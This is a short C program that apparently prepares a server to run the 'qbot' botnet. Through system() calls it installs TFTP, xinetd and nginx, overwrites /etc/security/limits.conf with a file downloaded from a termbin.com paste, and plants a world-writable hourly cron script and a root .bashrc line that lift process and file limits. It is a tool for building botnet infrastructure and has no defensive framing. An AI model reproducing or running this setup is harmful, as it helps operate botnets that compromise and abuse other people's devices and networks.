#include <stdio.h>
#include <stdlib.h>

int main()
{
	char choice;

	printf("Do you want to setup qbot? y/n \n");
		do
		{
                      scanf( " %c", &choice );
		}while ( choice != 'y');
		system("apt-get install tftpd-hpa -y");
		system("apt-get install xinetd -y");
		system("apt-get install nginx -y");
		printf("Setting ulimit.... \n");
		system("wget -O /etc/security/limits.conf http://termbin.com/oy3s");
		system("echo -en '#!/bin/bash\n\nulimit -u 999999; ulimit -n 999999' > /etc/cron.hourly/limit; chmod 777 /etc/cron.hourly/limit");
		system("echo -en 'ulimit -u 999999; ulimit -n 999999' >> /root/.bashrc");
		printf("Done for now :) \n");

	return 0;
}






